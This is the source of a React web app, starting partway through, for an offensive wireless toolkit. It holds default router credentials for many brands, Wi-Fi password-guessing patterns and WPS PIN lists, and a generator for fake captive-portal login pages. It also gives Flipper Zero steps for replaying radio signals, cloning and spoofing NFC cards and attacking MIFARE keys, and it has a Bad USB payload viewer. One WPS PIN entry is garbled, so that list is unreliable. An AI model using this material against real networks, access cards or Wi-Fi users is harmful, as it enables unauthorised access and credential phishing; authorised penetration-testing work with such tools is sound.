  { brand: 'Fritz!Box', patterns: ['', 'admin', 'fritzbox', 'password'], defaultUser: 'admin', notes: 'Popular in Germany/EU' },
  { brand: 'Technicolor', patterns: ['admin', 'password', 'Technicolor', 'mediaaccess'], defaultUser: 'admin', notes: 'ISP-provided gateways' },
  { brand: 'Sagemcom', patterns: ['admin', 'password', 'sagemcom', '1234'], defaultUser: 'admin', notes: 'Common EU ISP router' },
  { brand: 'Tenda', patterns: ['admin', '', 'password', 'tenda'], defaultUser: 'admin', notes: 'Budget routers, often blank' },
  { brand: 'Xiaomi', patterns: ['admin', 'xiaomi', 'password', '12345678'], defaultUser: 'admin', notes: 'Mi Router series' },
  { brand: 'Google Nest', patterns: ['N/A — app only'], defaultUser: 'N/A', notes: 'Managed via Google Home app' },
  { brand: 'Eero', patterns: ['N/A — app only'], defaultUser: 'N/A', notes: 'Amazon Eero app only' },
  { brand: 'Synology', patterns: ['admin', '', 'synology', 'password'], defaultUser: 'admin', notes: 'NAS/router combo devices' },
  { brand: 'Buffalo', patterns: ['admin', 'password', 'buffalo', ''], defaultUser: 'admin/root', notes: 'DD-WRT compatible routers' },
  { brand: 'Draytek', patterns: ['admin', '', 'password', 'vigor'], defaultUser: 'admin', notes: 'Business routers' },
  { brand: 'Peplink', patterns: ['admin', 'admin', 'peplink'], defaultUser: 'admin', notes: 'Enterprise SD-WAN' },
  { brand: 'Juniper', patterns: ['root', 'juniper', 'Juniper', 'abc123'], defaultUser: 'root', notes: 'SRX/EX series' },
  { brand: 'Fortinet', patterns: ['', 'admin', 'fortigate', 'password'], defaultUser: 'admin', notes: 'FortiGate: blank password default' },
  { brand: 'SonicWall', patterns: ['password', 'admin', 'sonicwall'], defaultUser: 'admin', notes: 'Firewall/VPN appliances' },
  { brand: 'Ruckus', patterns: ['super', 'sp-admin', 'admin'], defaultUser: 'super', notes: 'Wireless APs' },
  { brand: 'Meraki', patterns: ['N/A — cloud managed'], defaultUser: 'N/A', notes: 'Cisco Meraki: dashboard only' },
  { brand: 'Cambium', patterns: ['admin', 'admin', 'cambium'], defaultUser: 'admin', notes: 'Wireless ISP equipment' },
  { brand: 'EnGenius', patterns: ['admin', '', 'engenius', 'password'], defaultUser: 'admin', notes: 'SMB access points' },
];

const COMMON_PATTERNS = [
  { category: '8-Digit Numbers', examples: ['12345678', '00000000', '11111111', '88888888', '12344321', '12121212', '69696969', '13131313'], desc: 'Very common in default router passwords' },
  { category: 'Phone Numbers', examples: ['0612345678', '5551234567', '0032XXXXXXX'], desc: 'Local phone number formats' },
  { category: 'Company + Year', examples: ['Company2024', 'Company2025!', 'Corp2024WiFi', 'Office2025'], desc: 'Corporate WiFi naming convention' },
  { category: 'Pet Names', examples: ['buddy123', 'charlie1', 'maxwifi', 'bella2024', 'luna1234', 'coco2025'], desc: 'Popular pet names + numbers' },
  { category: 'Sports Teams', examples: ['arsenal1', 'realmadrid', 'lakers24', 'patriots1', 'FCBarcelona'], desc: 'Sports team names with numbers' },
  { category: 'Keyboard Walks', examples: ['qwertyui', 'asdfghjk', 'zxcvbnm1', 'qwerty123', '1qaz2wsx'], desc: 'Sequential keyboard patterns (8+ chars)' },
  { category: 'Name + Numbers', examples: ['john1234', 'sarah2024', 'david123', 'michael1'], desc: 'First name + digits' },
  { category: 'Location-Based', examples: ['amsterdam1', 'london2024', 'newyork1', 'paris1234'], desc: 'City/country names + numbers' },
  { category: 'Seasons/Months', examples: ['summer2024', 'winter2025', 'january1', 'spring24'], desc: 'Temporal passwords changed quarterly' },
  { category: 'Phrases', examples: ['iloveyou', 'letmein12', 'welcome1', 'trustno1', 'changeme'], desc: 'Common passphrase patterns' },
];

const WPS_KNOWN_PINS = [
  '12345670', '00000000', '01234567', '11111110', '22222220',
  '33333330', '44444440', '55555550', '66666660', '77777770',
  '88888880', '99999990', '10293847', '01onal85', '46264848',
  '76229909', '62327145', '10482657', '43977290', '59823617',
];

// ═══════════════════════════════════════════════════════
//  HELPER COMPONENTS
// ═══════════════════════════════════════════════════════

function CodeBlock({ code, label }) {
  return (
    <div style={{ position: 'relative', background: '#0a0e17', borderRadius: 8, border: `1px solid ${BORDER}`, overflow: 'hidden' }}>
      {label && (
        <div style={{ padding: '6px 12px', background: 'rgba(255,255,255,0.02)', borderBottom: `1px solid ${BORDER}`, fontFamily: mono, fontSize: 10, color: DIM }}>
          {label}
        </div>
      )}
      <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between' }}>
        <pre style={{ padding: '12px 14px', margin: 0, fontFamily: mono, fontSize: 11, color: ACC, overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all', flex: 1, lineHeight: 1.6 }}>
          {code}
        </pre>
        <CopyButton text={code} />
      </div>
    </div>
  );
}

function SectionTitle({ icon: Icon, text, accent = ACC }) {
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12, marginTop: 20 }}>
      {Icon && <Icon size={15} style={{ color: accent }} />}
      <span style={{ fontFamily: heading, fontSize: 14, fontWeight: 700, color: TEXT }}>{text}</span>
    </div>
  );
}

function Badge({ text, color = ACC }) {
  return (
    <span style={{
      fontFamily: mono, fontSize: 9, fontWeight: 600, color,
      background: `${color}15`, border: `1px solid ${color}25`,
      borderRadius: 4, padding: '2px 6px', textTransform: 'uppercase',
    }}>
      {text}
    </span>
  );
}

function SignalBars({ strength }) {
  const bars = strength > -50 ? 4 : strength > -60 ? 3 : strength > -70 ? 2 : 1;
  const color = bars >= 3 ? '#34D399' : bars === 2 ? '#FBBF24' : '#F87171';
  return (
    <div style={{ display: 'flex', alignItems: 'flex-end', gap: 1, height: 16 }}>
      {[1, 2, 3, 4].map(i => (
        <div key={i} style={{
          width: 3, height: 4 + i * 3, borderRadius: 1,
          background: i <= bars ? color : 'rgba(255,255,255,0.1)',
        }} />
      ))}
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  TAB 1: CAPTIVE PORTAL BUILDER
// ═══════════════════════════════════════════════════════

function PortalTab() {
  const [template, setTemplate] = useState('hotel');
  const [ssid, setSsid] = useState('');
  const [logoUrl, setLogoUrl] = useState('');
  const [terms, setTerms] = useState('');
  const [buttonText, setButtonText] = useState('');
  const [redirectUrl, setRedirectUrl] = useState('');
  const [theme, setTheme] = useState('dark');
  const [showPreview, setShowPreview] = useState(true);

  const html = useMemo(() => generatePortalHTML({
    template, ssid, logoUrl, terms, buttonText, redirectUrl, theme,
  }), [template, ssid, logoUrl, terms, buttonText, redirectUrl, theme]);

  const handleDownload = useCallback(() => {
    const blob = new Blob([html], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `captive-portal-${template}.html`;
    a.click();
    URL.revokeObjectURL(url);
  }, [html, template]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      <Card style={{ background: 'rgba(251,113,133,0.04)', border: '1px solid rgba(251,113,133,0.15)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          <AlertTriangle size={14} style={{ color: '#FB7185' }} />
          <span style={{ fontFamily: mono, fontSize: 11, color: '#FB7185', fontWeight: 600 }}>
            For authorized penetration testing only. Unauthorized use is illegal.
          </span>
        </div>
      </Card>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
        {/* Configuration */}
        <Card>
          <SectionTitle icon={FileText} text="Portal Configuration" />

          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            <div>
              <label style={{ fontFamily: mono, fontSize: 10, color: DIM, fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.05em', display: 'block', marginBottom: 6 }}>Template</label>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
                {PORTAL_TEMPLATES.map(t => (
                  <button
                    key={t.id}
                    onClick={() => setTemplate(t.id)}
                    style={{
                      display: 'flex', alignItems: 'center', gap: 5,
                      padding: '6px 12px', borderRadius: 6, cursor: 'pointer',
                      fontFamily: mono, fontSize: 10, fontWeight: 500,
                      background: template === t.id ? `${t.brandColor}18` : 'transparent',
                      border: template === t.id ? `1px solid ${t.brandColor}40` : `1px solid ${BORDER}`,
                      color: template === t.id ? t.brandColor : DIM,
                      transition: 'all 120ms ease',
                    }}
                  >
                    <span>{t.logo}</span> {t.label}
                  </button>
                ))}
              </div>
            </div>

            <Input label="Network SSID" value={ssid} onChange={e => setSsid(e.target.value)} placeholder="e.g. Marriott_Guest" />
            <Input label="Logo URL (optional)" value={logoUrl} onChange={e => setLogoUrl(e.target.value)} placeholder="https://example.com/logo.png" />
            <Input label="Terms Text (optional)" value={terms} onChange={e => setTerms(e.target.value)} placeholder="By connecting you agree..." />
            <Input label="Button Text" value={buttonText} onChange={e => setButtonText(e.target.value)} placeholder="Connect to WiFi" />
            <Input label="Redirect URL" value={redirectUrl} onChange={e => setRedirectUrl(e.target.value)} placeholder="https://www.google.com" />

            <div>
              <label style={{ fontFamily: mono, fontSize: 10, color: DIM, fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.05em', display: 'block', marginBottom: 6 }}>Theme</label>
              <div style={{ display: 'flex', gap: 6 }}>
                {['dark', 'light'].map(t => (
                  <button
                    key={t}
                    onClick={() => setTheme(t)}
                    style={{
                      padding: '6px 16px', borderRadius: 6, cursor: 'pointer',
                      fontFamily: mono, fontSize: 10, fontWeight: 500,
                      background: theme === t ? `${ACC}15` : 'transparent',
                      border: theme === t ? `1px solid ${ACC}35` : `1px solid ${BORDER}`,
                      color: theme === t ? ACC : DIM,
                    }}
                  >
                    {t === 'dark' ? '🌙' : '☀️'} {t}
                  </button>
                ))}
              </div>
            </div>

            <div style={{ display: 'flex', gap: 8, marginTop: 8 }}>
              <button
                onClick={handleDownload}
                style={{
                  display: 'flex', alignItems: 'center', gap: 6,
                  padding: '8px 16px', borderRadius: 8, cursor: 'pointer',
                  fontFamily: mono, fontSize: 11, fontWeight: 600,
                  background: `${ACC}15`, border: `1px solid ${ACC}30`,
                  color: ACC,
                }}
              >
                <Download size={13} /> Download HTML
              </button>
              <button
                onClick={() => setShowPreview(!showPreview)}
                style={{
                  display: 'flex', alignItems: 'center', gap: 6,
                  padding: '8px 16px', borderRadius: 8, cursor: 'pointer',
                  fontFamily: mono, fontSize: 11, fontWeight: 500,
                  background: 'transparent', border: `1px solid ${BORDER}`,
                  color: DIM,
                }}
              >
                {showPreview ? <EyeOff size={13} /> : <Eye size={13} />}
                {showPreview ? 'Hide Preview' : 'Show Preview'}
              </button>
            </div>
          </div>
        </Card>

        {/* Preview + Code */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          {showPreview && (
            <Card>
              <SectionTitle icon={Eye} text="Live Preview" />
              <div style={{ borderRadius: 8, overflow: 'hidden', border: `1px solid ${BORDER}`, height: 400 }}>
                <iframe
                  srcDoc={html}
                  title="Portal Preview"
                  sandbox="allow-scripts"
                  style={{ width: '100%', height: '100%', border: 'none', background: '#fff' }}
                />
              </div>
            </Card>
          )}

          <Card>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
              <SectionTitle icon={Terminal} text="Generated HTML" />
            </div>
            <div style={{ maxHeight: showPreview ? 200 : 500, overflow: 'auto' }}>
              <CodeBlock code={html} />
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  TAB 2: ATTACK REFERENCE
// ═══════════════════════════════════════════════════════

function AttackTab({ search }) {
  const [activeCat, setActiveCat] = useState('wpa');

  const filtered = useMemo(() => {
    const cat = ATTACK_CATEGORIES.find(c => c.key === activeCat);
    if (!cat) return [];
    if (!search) return cat.data;
    const s = search.toLowerCase();
    return cat.data.filter(e => e.cmd.toLowerCase().includes(s) || e.desc.toLowerCase().includes(s));
  }, [activeCat, search]);

  const cat = ATTACK_CATEGORIES.find(c => c.key === activeCat);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
        {ATTACK_CATEGORIES.map(c => {
          const Icon = c.icon;
          const active = activeCat === c.key;
          return (
            <button
              key={c.key}
              onClick={() => setActiveCat(c.key)}
              style={{
                display: 'flex', alignItems: 'center', gap: 6,
                padding: '6px 14px', borderRadius: 6, cursor: 'pointer',
                fontFamily: mono, fontSize: 10, fontWeight: 600,
                background: active ? `${c.accent}12` : 'transparent',
                border: active ? `1px solid ${c.accent}30` : `1px solid ${BORDER}`,
                color: active ? c.accent : '#6B7280',
                transition: 'all 120ms ease',
              }}
            >
              <Icon size={12} /> {c.label}
              <span style={{
                fontFamily: mono, fontSize: 9, color: active ? c.accent : '#4B5563',
                background: active ? `${c.accent}10` : 'rgba(255,255,255,0.03)',
                borderRadius: 4, padding: '1px 5px',
              }}>
                {c.data.length}
              </span>
            </button>
          );
        })}
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {filtered.map((entry, i) => (
          <Card key={i}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                <span style={{ fontFamily: mono, fontSize: 11, color: TEXT, fontWeight: 500 }}>{entry.desc}</span>
                {entry.reqs && <Badge text={entry.reqs} color={cat?.accent} />}
              </div>
              <CodeBlock code={entry.cmd} />
            </div>
          </Card>
        ))}
        {filtered.length === 0 && (
          <div style={{ textAlign: 'center', padding: 40, fontFamily: mono, fontSize: 12, color: '#4B5563' }}>
            No results for "{search}"
          </div>
        )}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  TAB 3: FLIPPER WIRELESS
// ═══════════════════════════════════════════════════════

function FlipperTab({ search }) {
  const [section, setSection] = useState('subghz');

  const sections = [
    { key: 'subghz', label: 'Sub-GHz', icon: Radio },
    { key: 'nfc', label: 'NFC/RFID', icon: CreditCard },
    { key: 'ir', label: 'IR Blaster', icon: Tv },
    { key: 'badusb', label: 'Bad USB', icon: Usb },
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <div style={{ display: 'flex', gap: 6 }}>
        {sections.map(s => {
          const Icon = s.icon;
          const active = section === s.key;
          return (
            <button
              key={s.key}
              onClick={() => setSection(s.key)}
              style={{
                display: 'flex', alignItems: 'center', gap: 6,
                padding: '6px 14px', borderRadius: 6, cursor: 'pointer',
                fontFamily: mono, fontSize: 10, fontWeight: 600,
                background: active ? `${ACC}12` : 'transparent',
                border: active ? `1px solid ${ACC}30` : `1px solid ${BORDER}`,
                color: active ? ACC : '#6B7280',
              }}
            >
              <Icon size={12} /> {s.label}
            </button>
          );
        })}
      </div>

      {section === 'subghz' && <SubGhzSection search={search} />}
      {section === 'nfc' && <NfcSection search={search} />}
      {section === 'ir' && <IrSection search={search} />}
      {section === 'badusb' && <BadUsbSection search={search} />}
    </div>
  );
}

function SubGhzSection({ search }) {
  const filteredProtos = useMemo(() => {
    if (!search) return FLIPPER_PROTOCOLS;
    const s = search.toLowerCase();
    return FLIPPER_PROTOCOLS.filter(p => p.name.toLowerCase().includes(s) || p.desc.toLowerCase().includes(s));
  }, [search]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
      <SectionTitle icon={Radio} text="Frequency Ranges" />
      <Card>
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: 11 }}>
            <thead>
              <tr>
                {['Range', 'Region', 'Common Devices'].map(h => (
                  <th key={h} style={{ textAlign: 'left', padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM, fontSize: 10, fontWeight: 600, textTransform: 'uppercase' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {FLIPPER_SUBGHZ_FREQS.map((f, i) => (
                <tr key={i}>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: ACC, fontWeight: 600 }}>{f.range}</td>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: TEXT }}>{f.region}</td>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM }}>{f.devices}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card>

      <SectionTitle icon={Cpu} text="Sub-GHz Protocols" />
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: 8 }}>
        {filteredProtos.map((p, i) => (
          <Card key={i}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 6 }}>
              <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 700, color: TEXT }}>{p.name}</span>
              <div style={{ display: 'flex', gap: 4 }}>
                <Badge text={`${p.bits} bits`} />
                <Badge text={p.encoding} color={p.encoding === 'Rolling' ? '#F87171' : '#34D399'} />
              </div>
            </div>
            <span style={{ fontFamily: mono, fontSize: 10, color: DIM, lineHeight: 1.5 }}>{p.desc}</span>
          </Card>
        ))}
      </div>

      <SectionTitle icon={Terminal} text="Capture & Replay Workflow" />
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
        {[
          '1. Sub-GHz → Read → Hold device near Flipper → press button',
          '2. If protocol recognized → Save → name the signal',
          '3. Sub-GHz → Saved → select signal → Send',
          '4. For unknown protocols: Sub-GHz → Read RAW → capture → Save → Send',
          '5. Frequency Analyzer: Sub-GHz → Frequency Analyzer → find transmission frequency',
        ].map((step, i) => (
          <div key={i} style={{
            padding: '8px 14px', borderRadius: 6, fontFamily: mono, fontSize: 11,
            background: 'rgba(125,211,252,0.04)', border: `1px solid ${BORDER}`,
            color: TEXT, display: 'flex', alignItems: 'center', gap: 8,
          }}>
            <ChevronRight size={12} style={{ color: ACC, flexShrink: 0 }} />
            {step}
          </div>
        ))}
      </div>

      <SectionTitle icon={FileText} text=".sub File Format Examples" />
      <CodeBlock code={FLIPPER_SUB_EXAMPLE_RAW} label="RAW File" />
      <CodeBlock code={FLIPPER_SUB_EXAMPLE_KEY} label="Key File" />
    </div>
  );
}

function NfcSection({ search }) {
  const filteredTypes = useMemo(() => {
    if (!search) return FLIPPER_NFC_TYPES;
    const s = search.toLowerCase();
    return FLIPPER_NFC_TYPES.filter(t => t.type.toLowerCase().includes(s) || t.notes.toLowerCase().includes(s));
  }, [search]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
      <SectionTitle icon={CreditCard} text="Supported Card Types" />
      <Card>
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: 11 }}>
            <thead>
              <tr>
                {['Type', 'Frequency', 'R/W/E', 'Notes'].map(h => (
                  <th key={h} style={{ textAlign: 'left', padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM, fontSize: 10, fontWeight: 600, textTransform: 'uppercase' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {filteredTypes.map((t, i) => (
                <tr key={i}>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: ACC, fontWeight: 600 }}>{t.type}</td>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: TEXT }}>{t.freq}</td>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}` }}>
                    <Badge text={t.rw} color={t.rw.includes('Write') ? '#34D399' : t.rw.includes('Emulate') ? '#A78BFA' : '#FBBF24'} />
                  </td>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM }}>{t.notes}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card>

      <SectionTitle icon={Key} text="Common MIFARE Classic Keys" />
      <Card>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
          {FLIPPER_MIFARE_KEYS.map((k, i) => (
            <div key={i} style={{
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              padding: '6px 10px', borderRadius: 6, background: 'rgba(255,255,255,0.02)', border: `1px solid ${BORDER}`,
            }}>
              <div>
                <span style={{ fontFamily: mono, fontSize: 11, color: ACC }}>{k.key}</span>
                <span style={{ fontFamily: mono, fontSize: 9, color: DIM, marginLeft: 8 }}>{k.desc}</span>
              </div>
              <CopyButton text={k.key} />
            </div>
          ))}
        </div>
      </Card>

      <SectionTitle icon={Terminal} text="NFC Workflows" />
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
        {[
          'Read: NFC → Read → hold card on Flipper back → auto-detect type',
          'Save: After reading → Save → name it → stored in /ext/nfc/',
          'Emulate: NFC → Saved → select → Emulate → hold Flipper to reader',
          'Write: NFC → Saved → select → Write → hold blank card to Flipper',
          'Detect Reader: NFC → Detect Reader → hold to reader → logs queries & keys',
          'UID Spoof: Save .nfc file → edit UID bytes → emulate modified UID',
          'Mifare Classic Attack: Read → if keys unknown → auto runs Darkside/Nested',
        ].map((step, i) => (
          <div key={i} style={{
            padding: '8px 14px', borderRadius: 6, fontFamily: mono, fontSize: 11,
            background: 'rgba(125,211,252,0.04)', border: `1px solid ${BORDER}`, color: TEXT,
            display: 'flex', alignItems: 'center', gap: 8,
          }}>
            <ChevronRight size={12} style={{ color: ACC, flexShrink: 0 }} />
            {step}
          </div>
        ))}
      </div>
    </div>
  );
}

function IrSection() {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
      <SectionTitle icon={Tv} text="IR Protocol Reference" />
      <Card>
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: 11 }}>
            <thead>
              <tr>
                {['Protocol', 'Bits', 'Common Devices'].map(h => (
                  <th key={h} style={{ textAlign: 'left', padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM, fontSize: 10, fontWeight: 600, textTransform: 'uppercase' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {FLIPPER_IR_PROTOCOLS.map((p, i) => (
                <tr key={i}>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: ACC, fontWeight: 600 }}>{p.name}</td>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: TEXT }}>{p.bits}</td>
                  <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM }}>{p.desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card>

      <SectionTitle icon={Zap} text="Universal Remote Codes" />
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: 8 }}>
        {[
          { device: 'TV Power', codes: ['Power: 0x20DF10EF (LG)', '0xE0E040BF (Samsung)', '0x02FD48B7 (Sony)'] },
          { device: 'AC Power', codes: ['Varies by brand — use Learn mode', 'Common: NEC/Samsung32 protocol'] },
          { device: 'Projector', codes: ['NEC: 0x1EA2', 'Epson: 0xC1AA09F6'] },
          { device: 'Soundbar', codes: ['Samsung: 0x00FF00FF', 'Sonos: IR not supported'] },
        ].map((d, i) => (
          <Card key={i}>
            <span style={{ fontFamily: heading, fontSize: 12, fontWeight: 700, color: TEXT, display: 'block', marginBottom: 6 }}>{d.device}</span>
            {d.codes.map((c, j) => (
              <div key={j} style={{ fontFamily: mono, fontSize: 10, color: DIM, padding: '2px 0' }}>{c}</div>
            ))}
          </Card>
        ))}
      </div>

      <SectionTitle icon={Terminal} text="IR Capture Workflow" />
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
        {[
          '1. Infrared → Learn New Remote → point original remote at Flipper',
          '2. Press button on original remote → Flipper captures signal',
          '3. Name the button → Save → add more buttons to build full remote',
          '4. Infrared → Saved Remotes → select → use individual buttons',
          '5. Universal Remotes: Infrared → Universal Remotes → TV/AC/Audio → cycles common codes',
        ].map((step, i) => (
          <div key={i} style={{
            padding: '8px 14px', borderRadius: 6, fontFamily: mono, fontSize: 11,
            background: 'rgba(125,211,252,0.04)', border: `1px solid ${BORDER}`, color: TEXT,
            display: 'flex', alignItems: 'center', gap: 8,
          }}>
            <ChevronRight size={12} style={{ color: ACC, flexShrink: 0 }} />
            {step}
          </div>
        ))}
      </div>

      <SectionTitle icon={FileText} text=".ir File Format" />
      <CodeBlock code={FLIPPER_IR_FILE_EXAMPLE} label="Flipper IR File" />
    </div>
  );
}

function BadUsbSection({ search }) {
  const [expandedPayload, setExpandedPayload] = useState(null);

  const filteredPayloads = useMemo(() => {
    if (!search) return FLIPPER_BADUSB_PAYLOADS;
    const s = search.toLowerCase();
    return FLIPPER_BADUSB_PAYLOADS.filter(p => p.name.toLowerCase().includes(s) || p.code.toLowerCase().includes(s));
  }, [search]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
      <SectionTitle icon={Terminal} text="DuckyScript v3 Cheatsheet" />
      <Card>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 4 }}>
          {DUCKY_CHEATSHEET.map((d, i) => (
            <div key={i} style={{
              display: 'flex', justifyContent: 'space-between', alignItems: 'center',
              padding: '5px 10px', borderRadius: 4,
              background: i % 2 === 0 ? 'rgba(255,255,255,0.015)' : 'transparent',
            }}>
              <span style={{ fontFamily: mono, fontSize: 10, color: ACC }}>{d.cmd}</span>
              <span style={{ fontFamily: mono, fontSize: 9, color: DIM, textAlign: 'right' }}>{d.desc}</span>
            </div>
          ))}
        </div>
      </Card>

      <SectionTitle icon={Usb} text={`Payloads (${filteredPayloads.length})`} />
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
        {filteredPayloads.map((p, i) => (
          <Card key={i}>
            <button
              onClick={() => setExpandedPayload(expandedPayload === i ? null : i)}
              style={{
                display: 'flex', alignItems: 'center', justifyContent: 'space-between', width: '100%',
                background: 'none', border: 'none', cursor: 'pointer', padding: 0,
              }}
            >
              <span style={{ fontFamily: heading, fontSize: 12, fontWeight: 600, color: TEXT }}>{p.name}</span>
              <ChevronRight size={13} style={{
                color: DIM, transition: 'transform 150ms',
                transform: expandedPayload === i ? 'rotate(90deg)' : 'rotate(0deg)',
              }} />
            </button>
            {expandedPayload === i && (
              <div style={{ marginTop: 10 }}>
                <CodeBlock code={p.code} />
              </div>
            )}
          </Card>
        ))}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  TAB 4: WIFI ANALYZER
// ═══════════════════════════════════════════════════════

function parseWifiOutput(text) {
  const networks = [];
  if (!text.trim()) return networks;

  const lines = text.split('\n').filter(l => l.trim());

  // Try nmcli format: SSID  BSSID  MODE  CHAN  RATE  SIGNAL  BARS  SECURITY
  const nmcliMatch = lines.some(l => /IN-USE|SSID\s+BSSID|SSID\s+MODE/i.test(l));
  if (nmcliMatch) {
    for (const line of lines) {
      if (/IN-USE|SSID\s+BSSID|SSID\s+MODE|^-/i.test(line)) continue;
      const parts = line.trim().split(/\s{2,}/);
      if (parts.length >= 4) {
        const signal = parseInt(parts.find(p => /^\d+$/.test(p)) || '0');
        const securityField = parts[parts.length - 1] || '';
        networks.push({
          ssid: parts[0]?.replace(/^\*?\s*/, '') || 'Hidden',
          bssid: parts.find(p => /([0-9A-F]{2}:){5}/i.test(p)) || 'N/A',
          channel: parseInt(parts.find(p => /^\d{1,3}$/.test(p) && parseInt(p) <= 165) || '0'),
          signal: signal > 0 ? -(100 - signal) : -70,
          security: securityField.includes('WPA3') ? 'WPA3' : securityField.includes('WPA2') ? 'WPA2' : securityField.includes('WPA') ? 'WPA' : securityField.includes('WEP') ? 'WEP' : securityField.includes('--') ? 'Open' : securityField || 'Unknown',
          frequency: '2.4 GHz',
        });
      }
    }
    return networks;
  }

  // Try airport -s format (macOS)
  const airportMatch = lines.some(l => /SSID\s+BSSID\s+RSSI/i.test(l));
  if (airportMatch) {
    for (const line of lines) {
      if (/SSID\s+BSSID/i.test(line)) continue;
      const match = line.match(/^\s*(.+?)\s+([0-9a-f:]{17})\s+(-?\d+)\s+(\d+)\s+\S+\s+\S+\s+(.+)$/i);
      if (match) {
        const ch = parseInt(match[4]);
        networks.push({
          ssid: match[1].trim() || 'Hidden',
          bssid: match[2],
          channel: ch,
          signal: parseInt(match[3]),
          security: match[5].trim(),
          frequency: ch > 14 ? '5 GHz' : '2.4 GHz',
        });
      }
    }
    return networks;
  }

  // Try iwlist format
  for (const line of lines) {
    const cellMatch = line.match(/Cell \d+/);
    if (cellMatch) {
      const bssid = (line.match(/Address:\s*([0-9A-F:]{17})/i) || [])[1] || '';
      networks.push({ ssid: '', bssid, channel: 0, signal: -70, security: 'Unknown', frequency: '2.4 GHz' });
    }
    const lastNet = networks[networks.length - 1];
    if (lastNet) {
      const ssidM = line.match(/ESSID:"([^"]*)"/);
      if (ssidM) lastNet.ssid = ssidM[1] || 'Hidden';
      const chM = line.match(/Channel[:\s]+(\d+)/i);
      if (chM) { lastNet.channel = parseInt(chM[1]); if (lastNet.channel > 14) lastNet.frequency = '5 GHz'; }
      const sigM = line.match(/Signal level[=:]?\s*(-?\d+)/i);
      if (sigM) lastNet.signal = parseInt(sigM[1]);
      const encM = line.match(/Encryption key:(on|off)/i);
      if (encM && encM[1] === 'off') lastNet.security = 'Open';
      const wpaM = line.match(/WPA2|WPA3|WPA|WEP/i);
      if (wpaM) lastNet.security = wpaM[0].toUpperCase();
    }
  }
  return networks.filter(n => n.bssid);
}

function AnalyzerTab() {
  const [rawInput, setRawInput] = useState('');
  const [networks, setNetworks] = useState([]);
  const [manualNetworks, setManualNetworks] = useState([]);
  const [sortKey, setSortKey] = useState('signal');
  const [sortDir, setSortDir] = useState('desc');
  const [manualForm, setManualForm] = useState({ ssid: '', bssid: '', channel: '', signal: '', security: 'WPA2' });

